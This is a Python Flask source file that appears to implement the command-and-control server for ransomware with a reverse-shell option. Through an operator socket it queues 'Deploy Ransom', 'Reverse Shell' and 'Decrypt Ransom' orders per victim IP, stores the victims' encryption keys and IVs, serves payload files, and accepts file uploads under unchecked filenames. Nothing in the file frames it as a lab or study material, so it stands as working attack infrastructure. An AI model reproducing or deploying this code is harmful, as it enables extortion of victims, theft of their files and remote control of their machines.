from flask import Flask, jsonify, request, send_from_directory
from flask_socketio import SocketIO

app = Flask(__name__)
socketio = SocketIO(app)

# Initialize counters
endpoint1_counter = 0
endpoint2_counter = 0

# Initialize a dictionary to store request counts for each IP
ip_counts = {}

current_client_ip = None


def record_request(client_ip):
    if client_ip not in ip_counts:
        ip_counts[client_ip] = {'shell': False, 'ransom': False, 'decrypt': False }


@app.route('/get-file/<filename>')
def get_file(filename):
    directory = "files"  # Directory where the file is located
    return send_from_directory(directory, filename, as_attachment=True)


@app.route('/endpoint1', methods=['GET'])
def endpoint1():
    client_ip = request.remote_addr
    record_request(client_ip)
    socketio.emit('reset_timer', {'ip': client_ip})

    global current_client_ip

    print(ip_counts)
    shell_value = ip_counts[client_ip]['shell']
    ransom_flag = ip_counts[client_ip]['ransom']
    decrypt_ransom = ip_counts[client_ip]['decrypt']

    if shell_value:
        ip_counts[client_ip]['shell'] = False

    if ransom_flag:
        ip_counts[client_ip]['ransom'] = False

    if decrypt_ransom:
        ip_counts[client_ip]['decrypt'] = False
        ip_counts[client_ip]['encrypted'] = False

    return jsonify({
        "message": "Endpoint 1 was called",
        "ransom_activate": ransom_flag,
        "open_shell": shell_value,
        "client_ip": current_client_ip,
        "ransom_decrypt": decrypt_ransom
    })

#Register the request sent by the controller app
@socketio.on('action_event')
def handle_action_event(data):
    ip = data['ip']
    action = data['action']
    print(f"Received action '{action}' for IP: {ip}")
    if action == "Deploy Ransom":
        ip_counts[ip]['ransom'] = True
    elif action == "Reverse Shell":
        ip_counts[ip]['shell'] = True
    elif action == "Decrypt Ransom":
        ip_counts[ip]['decrypt'] = True

@socketio.on('request_all_ips')
def handle_request_all_ips():
    # Emit an event with the current list of connected IPs
    global current_client_ip
    current_client_ip = request.remote_addr
    print("Client connected from IP", current_client_ip)
    socketio.emit('all_ips', {'ip_counts': ip_counts})


@app.route('/save-key', methods=['POST'])
def receive_data():
    # Access the data sent with the POST request
    client_ip = request.remote_addr
    print('Body: %s', request.get_data())

    key = request.form.get('key')
    iv = request.form.get('iv')
    if key and iv:
        ip_counts[client_ip]['encrypted'] = True
        ip_counts[client_ip]['key'] = key
        ip_counts[client_ip]['iv'] = iv
        print(f'Encrypted IP {client_ip}')
        return jsonify({"message": "Key stored successfully"}), 200
    else:
        return jsonify({"error": "No key provided"}), 400
    
@app.route('/get-key', methods=['GET'])
def get_key():
    # Access the data sent with the POST request
    client_ip = request.remote_addr
    key_str = ip_counts[client_ip]['key']
    iv = ip_counts[client_ip]['iv']
    
    return jsonify({"key": key_str,
                    "iv": iv}), 200
    
@app.route('/upload', methods=['POST'])
def upload_file():
    if 'file' not in request.files:
        return 'No file part', 400

    file = request.files['file']
    if file.filename == '':
        return 'No selected file', 400

    if file:
        # Save the file
        file.save('./' + file.filename)
        return 'File uploaded successfully', 200

if __name__ == "__main__":
    socketio.run(app, debug=True, host="0.0.0.0", port=3000, allow_unsafe_werkzeug=True)
